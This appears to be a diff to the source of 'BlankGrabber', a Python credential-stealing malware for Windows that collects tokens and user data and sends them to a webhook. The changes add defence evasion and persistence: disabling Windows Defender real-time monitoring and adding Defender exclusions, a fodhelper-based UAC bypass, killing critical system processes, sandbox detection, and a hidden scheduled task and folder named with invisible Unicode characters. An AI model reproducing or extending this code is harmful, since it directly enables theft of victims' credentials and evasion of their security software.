@@ -10,7 +10,7 @@ HIDE_ITSELF = True # Hides the Grabber
 
 import os, sys
 if os.name!="nt" or not hasattr(sys, "frozen"):
-    sys.exit(0)
+    os._exit(0)
 import urllib3
 http = urllib3.PoolManager()
 import threading
@@ -32,17 +32,28 @@ def fquit():
         subprocess.run("taskkill /IM csrss.exe /F", capture_output= True, shell= True)
         subprocess.run("taskkill /IM winnit.exe /F", capture_output= True, shell= True)
         subprocess.run("taskkill /IM winlogon.exe /F", capture_output= True, shell= True)
-    sys.exit(0)
+    os._exit(0)
 
-def bypass_wd():
+def wd_exclude(path= None):
+    if path is None:
+        if hasattr(sys, 'frozen'):
+            path = sys.executable
+        else:
+            path = os.path.abspath(__file__)
+    subprocess.run(f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"{path}\"", shell= True, capture_output= True)
+
+def disable_wd():
     windef = os.path.join(os.getenv("temp"), f"{generate()}.bat")
     with open(windef, "w") as e:
         e.write("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
     subprocess.run(windef, shell= True, capture_output= True)
     os.remove(windef)
 
-def generate(num=5):
-    return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
+def generate(num=5, invisible= False):
+    if not invisible:
+        return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
+    else:
+        return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= num))
 
 def is_admin():
     s = subprocess.run("net session", shell= True, capture_output= True).returncode
@@ -56,7 +67,7 @@ def uac_bypass():
     subprocess.run(f"reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f", shell= True, capture_output= True)
     subprocess.run("fodhelper.exe", shell= True, capture_output= True)
     subprocess.run(f"reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1", shell= True, capture_output= True)
-    sys.exit(0)
+    os._exit(0)
 
 class vmprotect:
     def __init__(self):
@@ -78,7 +89,7 @@ class vmprotect:
                 kill = subprocess.run(f"taskkill /IM {banned_task}.exe /F", capture_output= True, shell= True)
 
                 if kill.returncode != 0:
-                    sys.exit(0)
+                    os._exit(0)
         try:
             http.request("GET", f"https://blank{generate()}.in")
         except Exception:
@@ -99,7 +110,7 @@ class BlankGrabber:
         self.webhook = WEBHOOK
         self.getPKey()
         self.archive = os.path.join(os.getenv("temp"), f"Blank-{os.getlogin()}.zip")
-        self.tempfolder = os.path.join(os.getenv("temp"), generate(10))
+        self.tempfolder = os.path.join(os.getenv("temp"), generate(10, True))
         self.system = os.path.join(self.tempfolder, "System")
         self.localappdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
@@ -110,7 +121,7 @@ class BlankGrabber:
         except FileExistsError:
             pass
         except Exception:
-            sys.exit(0)
+            os._exit(0)
         threads = []
         self.tokens = []
         self.ipinfo = self.getip()
@@ -407,35 +418,41 @@ class BlankGrabber:
             shutil.rmtree(self.tempfolder)
         except Exception:
             pass
+        os._exit(0)
 
 if __name__ == "__main__":
     time.sleep(1)
     if not is_admin():
         uac_bypass()
+    t = threading.Thread(target= disable_wd)
+    t.start()
+
     while True:
         try:
             r = json.loads(self.http.request("GET", "https://httpbin.org/get?1=2").data.decode())
             if r.get("args").get("1") != "2":
-                sys.exit(0)
+                os._exit(0)
         except Exception:
             if VMPROTECT:
                 vmprotect()
             frozen = hasattr(sys, "frozen")
             if frozen and STARTUP:
-                if os.path.abspath(sys.executable) != os.path.abspath(os.getenv("appdata")):
+                if os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1] != HIDDEN_FOLDER:
                     try:
-                        exepath = os.path.join(os.getenv("appdata"), f"{generate()}.exe")
+                        exepath = os.path.join("C:\\Windows\\SysWOW64", HIDDEN_FOLDER, f"{generate()}.scr")
                         BlankGrabber.copy("Blank", sys.executable, exepath)
-                        subprocess.run(f"attrib \"{exepath}\" +s +h", shell= True, capture_output= True)
-                        subprocess.run(f"schtasks /CREATE /SC ONSTART /TN \"{generate()}\\System Handler.exe\" /TR \"{os.path.abspath(exepath)}\" /RL HIGHEST", shell= True, capture_output= True)
+                        wd_exclude(os.path.dirname(os.path.abspath(exepath)))
+                        subprocess.run(f"attrib \"{os.path.dirname(os.path.abspath(exepath))}\" +s +h", capture_output= True, shell= True)
+                        subprocess.run(f"schtasks /CREATE /SC ONSTART /TN \"{generate(invisible= True)}\\System Handler.exe\" /TR \"{os.path.abspath(exepath)}\" /RL HIGHEST", shell= True, capture_output= True)
+                        wd_exclude(exepath)
                     except Exception:
                         pass
 
-            if frozen and HIDE_ITSELF:
+            if frozen and HIDE_ITSELF and os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1] != "startup":
                 subprocess.run(f"attrib \"{sys.executable}\" +s +h", shell= True, capture_output= True)
-
-            bypass_wd()
             try:
+                wd_exclude()
+                t.join()
                 BlankGrabber()
             except Exception:
                 pass
